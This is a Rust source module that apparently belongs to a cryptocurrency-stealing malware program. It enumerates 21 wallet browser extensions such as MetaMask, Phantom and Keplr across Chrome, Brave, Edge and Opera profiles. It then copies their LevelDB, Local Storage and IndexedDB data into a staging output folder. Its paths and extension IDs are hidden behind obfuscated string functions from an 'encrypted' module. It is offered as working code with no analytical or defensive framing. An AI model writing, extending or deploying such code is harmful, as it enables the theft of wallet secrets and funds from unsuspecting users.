use std::path::PathBuf;
use std::fs;
use crate::encrypted::*;

struct WalletExtension {
    name_fn: fn() -> String,
    id_fn: fn() -> String,
    browser_fns: Vec<fn() -> String>,
}

fn get_wallet_extensions() -> Vec<WalletExtension> {
    vec![
        WalletExtension { name_fn: s_wext_metamask, id_fn: s_wext_metamask_id, browser_fns: vec![s_wext_chrome, s_wext_brave, s_wext_edge, s_wext_opera] },
        WalletExtension { name_fn: s_wext_phantom, id_fn: s_wext_phantom_id, browser_fns: vec![s_wext_chrome, s_wext_brave, s_wext_edge] },
        WalletExtension { name_fn: s_wext_coinbase, id_fn: s_wext_coinbase_id, browser_fns: vec![s_wext_chrome, s_wext_brave, s_wext_edge] },
        WalletExtension { name_fn: s_wext_tronlink, id_fn: s_wext_tronlink_id, browser_fns: vec![s_wext_chrome, s_wext_brave, s_wext_edge] },
        WalletExtension { name_fn: s_wext_ronin, id_fn: s_wext_ronin_id, browser_fns: vec![s_wext_chrome, s_wext_brave] },
        WalletExtension { name_fn: s_wext_binance_chain, id_fn: s_wext_binance_chain_id, browser_fns: vec![s_wext_chrome, s_wext_brave] },
        WalletExtension { name_fn: s_wext_trust, id_fn: s_wext_trust_id, browser_fns: vec![s_wext_chrome, s_wext_brave, s_wext_edge] },
        WalletExtension { name_fn: s_wext_walletconnect, id_fn: s_wext_walletconnect_id, browser_fns: vec![s_wext_chrome, s_wext_brave] },
        WalletExtension { name_fn: s_wext_math, id_fn: s_wext_math_id, browser_fns: vec![s_wext_chrome, s_wext_brave] },
        WalletExtension { name_fn: s_wext_nifty, id_fn: s_wext_nifty_id, browser_fns: vec![s_wext_chrome, s_wext_brave] },
        WalletExtension { name_fn: s_wext_liquality, id_fn: s_wext_liquality_id, browser_fns: vec![s_wext_chrome, s_wext_brave] },
        WalletExtension { name_fn: s_wext_xdefi, id_fn: s_wext_xdefi_id, browser_fns: vec![s_wext_chrome, s_wext_brave] },
        WalletExtension { name_fn: s_wext_nami, id_fn: s_wext_nami_id, browser_fns: vec![s_wext_chrome, s_wext_brave] },
        WalletExtension { name_fn: s_wext_eternl, id_fn: s_wext_eternl_id, browser_fns: vec![s_wext_chrome, s_wext_brave] },
        WalletExtension { name_fn: s_wext_yoroi, id_fn: s_wext_yoroi_id, browser_fns: vec![s_wext_chrome, s_wext_brave, s_wext_edge] },
        WalletExtension { name_fn: s_wext_solflare, id_fn: s_wext_solflare_id, browser_fns: vec![s_wext_chrome, s_wext_brave, s_wext_edge] },
        WalletExtension { name_fn: s_wext_slope, id_fn: s_wext_slope_id, browser_fns: vec![s_wext_chrome, s_wext_brave] },
        WalletExtension { name_fn: s_wext_keplr, id_fn: s_wext_keplr_id, browser_fns: vec![s_wext_chrome, s_wext_brave, s_wext_edge] },
        WalletExtension { name_fn: s_wext_cosmostation, id_fn: s_wext_cosmostation_id, browser_fns: vec![s_wext_chrome, s_wext_brave] },
        WalletExtension { name_fn: s_wext_coin98, id_fn: s_wext_coin98_id, browser_fns: vec![s_wext_chrome, s_wext_brave, s_wext_edge] },
        WalletExtension { name_fn: s_wext_onekey, id_fn: s_wext_onekey_id, browser_fns: vec![s_wext_chrome, s_wext_brave, s_wext_edge] },
    ]
}

fn get_browser_data_paths() -> Vec<(String, PathBuf)> {
    let mut paths = Vec::new();
    
    if let Ok(local_appdata) = std::env::var(s_localappdata()) {
        let base = PathBuf::from(local_appdata);
        
        paths.push((s_wext_chrome(), base.join(s_wpath_google()).join(s_wpath_chrome_ud()).join(s_wpath_user_data())));
        paths.push((s_wext_brave(), base.join(s_wpath_bravesoftware()).join(s_wpath_brave_browser()).join(s_wpath_user_data())));
        paths.push((s_wext_edge(), base.join(s_wpath_microsoft()).join(s_wpath_edge_ud()).join(s_wpath_user_data())));
        paths.push((s_wext_opera(), base.join(s_wpath_opera_software()).join(s_wpath_opera_stable())));
    }
    
    paths
}

fn get_profiles(user_data_path: &PathBuf) -> Vec<(String, PathBuf)> {
    let mut profiles = Vec::new();
    
    let local_state = user_data_path.join(s_wpath_local_state());
    if let Ok(content) = fs::read_to_string(&local_state) {
        if let Ok(json) = serde_json::from_str::<serde_json::Value>(&content) {
            if let Some(cache) = json.get(s_wpath_profile()).and_then(|v| v.get(s_wpath_info_cache())).and_then(|v| v.as_object()) {
                for name in cache.keys() {
                    if name == s_wpath_system_profile().as_str() {
                        continue;
                    }
                    let path = user_data_path.join(name);
                    if path.is_dir() {
                        profiles.push((name.clone(), path));
                    }
                }
            }
        }
    }
    
    if profiles.is_empty() {
        if let Ok(entries) = fs::read_dir(user_data_path) {
            for entry in entries.flatten() {
                if !entry.path().is_dir() {
                    continue;
                }
                let name = entry.file_name().to_string_lossy().to_string();
                if name == s_wpath_system_profile() || name.starts_with('.') {
                    continue;
                }
                let is_profile = name == s_wpath_default()
                    || name.starts_with(&s_wpath_profile_prefix())
                    || entry.path().join(s_wpath_preferences()).exists();
                if is_profile {
                    profiles.push((name, entry.path()));
                }
            }
        }
    }
    
    if profiles.is_empty() && user_data_path.exists() {
        profiles.push((s_wpath_default(), user_data_path.clone()));
    }
    
    profiles.sort_by(|a, b| {
        let a_key = if a.0 == s_wpath_default() { (0, 0) } else { (1, a.0.parse::<u32>().unwrap_or(0)) };
        let b_key = if b.0 == s_wpath_default() { (0, 0) } else { (1, b.0.parse::<u32>().unwrap_or(0)) };
        a_key.cmp(&b_key)
    });
    
    profiles
}

fn copy_wallet_files(source_dir: &PathBuf, dest_dir: &PathBuf) {
    if !source_dir.exists() {
        return;
    }
    
    let _ = fs::create_dir_all(dest_dir);
    
    let file_patterns = [s_wpat_log(), s_wpat_ldb(), s_wpat_sst(), s_wpat_current(), s_wpat_lock()];
    
    if let Ok(entries) = fs::read_dir(source_dir) {
        for entry in entries.flatten() {
            let file_name = entry.file_name().to_string_lossy().to_string();
            let file_path = entry.path();
            
            if file_path.is_file() {
                let should_copy = file_patterns.iter().any(|p| {
                    if p.starts_with('*') {
                        file_name.ends_with(&p[1..])
                    } else {
                        file_name == *p
                    }
                });
                
                if should_copy {
                    let dest_file = dest_dir.join(&file_name);
                    let _ = fs::copy(&file_path, &dest_file);
                }
            }
        }
    }
    
    for subdir in &[s_wpath_local_storage(), s_wpath_indexeddb(), s_wpath_session_storage()] {
        let source_sub = source_dir.join(subdir);
        let dest_sub = dest_dir.join(subdir);
        
        if source_sub.exists() {
            copy_directory_recursive(&source_sub, &dest_sub);
        }
    }
}

fn copy_directory_recursive(source: &PathBuf, dest: &PathBuf) {
    if !source.exists() {
        return;
    }
    
    let _ = fs::create_dir_all(dest);
    
    if let Ok(entries) = fs::read_dir(source) {
        for entry in entries.flatten() {
            let source_path = entry.path();
            let dest_path = dest.join(entry.file_name());
            
            if source_path.is_dir() {
                copy_directory_recursive(&source_path, &dest_path);
            } else {
                let _ = fs::copy(&source_path, &dest_path);
            }
        }
    }
}

pub fn extract_browser_wallets() {
    let wallets = get_wallet_extensions();
    let browser_paths = get_browser_data_paths();
    let output_dir = super::get_wallet_output_dir();
    
    for wallet in &wallets {
        let w_name = (wallet.name_fn)();
        let w_id = (wallet.id_fn)();
        let w_browsers: Vec<String> = wallet.browser_fns.iter().map(|f| f()).collect();
        
        for (browser_name, browser_data_path) in &browser_paths {
            if !w_browsers.contains(browser_name) {
                continue;
            }
            
            if !browser_data_path.exists() {
                continue;
            }
            
            let profiles = get_profiles(browser_data_path);
            
            for (profile_name, profile_path) in profiles {
                let extension_path = profile_path
                    .join(s_wpath_local_ext())
                    .join(&w_id);
                
                if extension_path.exists() {
                    let dest_path = output_dir
                        .join(&w_name)
                        .join(browser_name)
                        .join(&profile_name);
                    
                    copy_wallet_files(&extension_path, &dest_path);
                }
                
                let sync_path = profile_path
                    .join(s_wpath_sync_ext())
                    .join(&w_id);
                
                if sync_path.exists() {
                    let dest_path = output_dir
                        .join(&w_name)
                        .join(browser_name)
                        .join(&profile_name)
                        .join(s_wpath_sync());
                    
                    copy_wallet_files(&sync_path, &dest_path);
                }
            }
        }
    }
}
